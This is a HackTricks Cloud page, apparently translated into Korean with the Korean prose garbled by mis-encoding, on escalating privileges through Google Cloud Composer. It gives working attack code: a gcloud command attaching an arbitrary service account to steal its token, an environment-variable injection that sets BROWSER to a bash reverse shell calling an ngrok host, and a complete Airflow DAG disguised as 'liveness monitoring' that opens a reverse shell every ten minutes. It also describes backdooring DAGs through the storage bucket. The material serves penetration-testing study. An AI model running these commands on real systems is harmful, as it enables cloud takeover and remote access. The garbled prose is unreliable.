# GCP - Composer Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## composer

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

í•´ë‹¹ ê¶Œí•œìœ¼ë¡œ ìƒˆë¡œ ìƒì„±ëœ composer í™˜ê²½ì— **ëª¨ë“  ì„œë¹„ìŠ¤ ê³„ì •**ì„ **ì—°ê²°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´í›„ composer ë‚´ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
ë” ë§ì€ ì •ë³´ëŠ” [**ì—¬ê¸°**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/i-composer.environmets.create.sh)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `composer.environments.update`

í™˜ê²½ ë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ëŠ” ë“± composer í™˜ê²½ì„ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

TODO: í™˜ê²½ì— ìƒˆë¡œìš´ pypi íŒ¨í‚¤ì§€ë¥¼ ì¶”ê°€í•˜ì—¬ RCE ì–»ê¸°

### Dags ë‹¤ìš´ë¡œë“œ

ì‹¤í–‰ ì¤‘ì¸ dagsì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### DAG ê°€ì ¸ì˜¤ê¸°

íŒŒì´ì¬ DAG ì½”ë“œë¥¼ íŒŒì¼ì— ì¶”ê°€í•˜ê³  ì‹¤í–‰í•˜ì—¬ ê°€ì ¸ì˜µë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
{% endcode %}

ë¦¬ë²„ìŠ¤ ì…¸ DAG:

{% code title="reverse_shell.py" %}
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
{% endcode %}

### Composer ë²„í‚·ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œ

ëª¨ë“  composer í™˜ê²½ì˜ êµ¬ì„± ìš”ì†Œ(DAG, í”ŒëŸ¬ê·¸ì¸ ë° ë°ì´í„°)ëŠ” GCP ë²„í‚· ë‚´ì— ì €ì¥ë©ë‹ˆë‹¤. ê³µê²©ìê°€ í•´ë‹¹ ë²„í‚·ì— ëŒ€í•œ ì½ê¸° ë° ì“°ê¸° ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê·¸ëŠ” ë²„í‚·ì„ ëª¨ë‹ˆí„°ë§í•˜ê³  **DAGê°€ ìƒì„±ë˜ê±°ë‚˜ ì—…ë°ì´íŠ¸ë  ë•Œë§ˆë‹¤ ë°±ë„ì–´ê°€ í¬í•¨ëœ ë²„ì „ì„ ì œì¶œí•˜ì—¬ composer í™˜ê²½ì´ ì €ì¥ì†Œì—ì„œ ë°±ë„ì–´ê°€ í¬í•¨ëœ ë²„ì „ì„ ê°€ì ¸ì˜¤ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ì´ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

### í”ŒëŸ¬ê·¸ì¸ ê°€ì ¸ì˜¤ê¸°

TODO: í”ŒëŸ¬ê·¸ì¸ì„ ì—…ë¡œë“œí•˜ì—¬ ì–´ë–¤ ê²ƒì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸

### ë°ì´í„° ê°€ì ¸ì˜¤ê¸°

TODO: ë°ì´í„°ë¥¼ ì—…ë¡œë“œí•˜ì—¬ ì–´ë–¤ ê²ƒì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
